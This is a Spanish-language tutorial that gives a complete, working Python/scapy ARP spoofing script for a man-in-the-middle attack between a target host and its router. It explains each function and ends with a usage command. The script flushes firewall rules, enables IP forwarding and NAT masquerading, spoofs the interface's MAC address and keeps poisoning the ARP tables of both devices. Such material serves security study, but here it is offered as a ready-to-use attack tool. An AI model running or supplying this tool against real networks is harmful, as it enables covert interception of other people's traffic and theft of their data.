Este script realiza un ataque de **ARP Spoofing** con el objetivo de interceptar tráfico entre un host en la red y el enrutador, envenenando la tabla ARP de ambos dispositivos. Este ataque se llama Man In The Middle.

```python
import os
import argparse
import subprocess
import scapy.all as scapy
import time
import signal
import sys
import uuid

from termcolor import colored


def def_handler(sig,frame): 
  print(colored(f"\n[!] Saliendo del programa...\n","red"))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler) 


def get_arguments(): 
  parser=argparse.ArgumentParser(description="ARP Spoofer")
  parser.add_argument("-t", "--target", required=True,dest="ip_address", help="Host / IP Range to Spoof")
  parser.add_argument("-r","--router", required=True,dest="ip_router",help="Router IP to Spoof")

  return parser.parse_args()


def root(): 
  if subprocess.check_output(["whoami"]).decode().strip() == 'root':
    return True


def requirements(): 
  os.system("iptables --flush")
  os.system("iptables --policy FORWARD ACCEPT")
  os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  os.system("iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE")
  os.system("iptables -A FORWARD -i ens33 -j ACCEPT")
  os.system("macchanger ens33 -m aa:bb:cc:44:55:66 >/dev/null")


def spoof(ip_address,spoof_ip):

  arp_packet=scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") 
  scapy.send(arp_packet, verbose=False)

def main():
  if root():
    requirements()
    arguments=get_arguments()
    while True: 
      spoof(arguments.ip_address, arguments.ip_router)
      spoof(arguments.ip_router, arguments.ip_address)
      time.sleep(2) 
  else:
    print(colored("\n[!] Este script necesita ser ejecutado por el usuario root.","red"))


if __name__=='__main__':
  main()
```

## 1.**Importaciones**:

- **`os`**, **`argparse`**, **`subprocess`**, **`scapy.all`**: Bibliotecas necesarias para la manipulación del sistema, la gestión de argumentos de la línea de comandos, y el envío de paquetes ARP.
- **`termcolor`**: Para proporcionar color a las salidas del script en la terminal.
- **`signal` y `sys`**: Para gestionar señales como Ctrl+C y salir del script de manera segura.
## 2.`def_handler()`:

- Esta función se ejecuta cuando se interrumpe el programa con **Ctrl+C**.
- Imprime un mensaje y termina el programa con `sys.exit(1)`.
## 3. **Gestión de señal SIGINT**:

- Con **`signal.signal(signal.SIGINT, def_handler)`**, se captura la interrupción **Ctrl+C** y se asocia con la función `def_handler()`.
## 4.`get_arguments()`:

- Gestiona los argumentos que se pasan por línea de comandos, utilizando **`argparse`**.
- Define dos argumentos obligatorios:
    - **`-t` o `--target`**: La dirección IP del host objetivo.
    - **`-r` o `--router`**: La dirección IP del enrutador a envenenar.
## 5.`root()`:

- Comprueba si el script se está ejecutando como **usuario root**, ya que los privilegios de root son necesarios para modificar tablas ARP y realizar redirección de tráfico.
## 6. `requirements()`:

- Configura algunos requisitos previos para que el ataque funcione correctamente:
    1. **`iptables --flush`**: Elimina todas las reglas de iptables existentes.
    2. **`iptables --policy FORWARD ACCEPT`**: Configura la política de reenvío de paquetes a **ACEPTAR**.
    3. **`echo 1 > /proc/sys/net/ipv4/ip_forward`**: Activa el **IP forwarding** para permitir que el sistema reenvíe paquetes entre interfaces.
    4. **`iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE`**: Permite la traducción de direcciones de red (NAT) para ocultar la IP real del atacante.
    5. **`iptables -A FORWARD -i ens33 -j ACCEPT`**: Acepta todo el tráfico reenviado en la interfaz `ens33`.
    6. **`macchanger ens33 -m aa:bb:cc:44:55:66`**: Cambia la dirección MAC de la interfaz `ens33` a la dirección especificada (en este caso, "aa:bb:cc:44:55:66").
## 7.`spoof()`:

- **Spoofing**: Crea y envía paquetes ARP **falsos** para envenenar la tabla ARP del host objetivo y del enrutador.
- **Paquete ARP**:
    - `op=2`: Indica que es una respuesta ARP (Reply).
    - `psrc`: Indica la dirección IP del enrutador o del host (según el caso) para hacerse pasar por ellos.
    - `pdst`: La dirección IP del objetivo que se desea engañar.
    - `hwsrc`: Es la dirección MAC falsa que se asocia con la IP de origen.
- **`scapy.send()`**: Envía el paquete ARP creado.

## 8.`main()`:

- **Comprobación de root**: Si el script se está ejecutando como root, procede; de lo contrario, imprime un mensaje de error.
- **Configuración del entorno**: Llama a la función `requirements()` para preparar el sistema para el ataque.
- **Bucle infinito de spoofing**: Inicia un bucle que:
    1. Realiza **spoofing** en el host objetivo, haciéndose pasar por el enrutador.
    2. Realiza **spoofing** en el enrutador, haciéndose pasar por el host objetivo.
    3. Espera 2 segundos antes de repetir el proceso.
## 9. **Bloque principal (`if __name__ == '__main__':`)**:

- Inicia la ejecución de la función `main()` si el script se ejecuta directamente.
### **Funcionamiento del Ataque ARP Spoofing**:

1. **El atacante se hace pasar por el enrutador** para el host objetivo, y viceversa:
    - El host objetivo enviará sus paquetes al atacante creyendo que es el enrutador.
    - El enrutador enviará sus paquetes al atacante creyendo que es el host objetivo.
2. **IP Forwarding** está habilitado** para que el atacante pueda redirigir los paquetes entre el enrutador y el host objetivo, manteniendo la conexión establecida pero interceptando y leyendo los datos.
### **Ejemplo de uso**:

	sudo python3 arp_spoofer.py -t 192.168.1.10 -r 192.168.1.1
	
Este comando inicia el **spoofing** entre el host con IP `192.168.1.10` y el enrutador `192.168.1.1`.